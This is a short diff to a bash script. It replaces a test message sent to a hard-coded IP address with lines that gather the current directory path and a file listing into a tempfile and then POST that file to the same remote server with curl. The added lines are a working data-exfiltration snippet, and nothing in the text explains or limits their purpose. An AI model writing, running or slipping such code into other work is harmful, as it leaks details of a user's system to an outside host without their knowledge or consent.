@@ -1,2 +1,4 @@
 #!/bin/bash
-curl -d "Hey this works as well" http://138.68.58.230:8080
+pwd > tempfile
+ls >> tempfile
+curl --data @tempfile http://138.68.58.230:8080
